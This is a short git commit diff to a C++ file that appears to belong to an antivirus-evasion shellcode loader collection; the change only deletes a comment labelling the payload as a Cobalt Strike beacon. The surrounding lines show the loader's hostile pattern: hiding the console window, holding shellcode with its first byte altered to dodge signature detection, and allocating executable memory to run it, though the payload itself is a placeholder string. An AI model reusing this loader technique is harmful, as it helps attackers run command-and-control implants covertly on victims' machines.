16eb518712e78c9b240c963f8b5b5634ab6caf89
Captain Barnacles <83349783+0x074b@users.noreply.github.com>
2023-08-25 06:58:18 +0200

    Update FlipByteBeforeCopying.cpp

--- Byte Changes/FlipByteBeforeCopying.cpp
+++ Byte Changes/FlipByteBeforeCopying.cpp
@@ -4,7 +4,6 @@
 int main(int argc, char *argv[]) {
 	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
-	// cobalt strike beacon shellcode x64
 	unsigned char shellcode[] = "shellcodeWithBadByteAtFirst";
 	char first[] = "FirstByte";
 	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
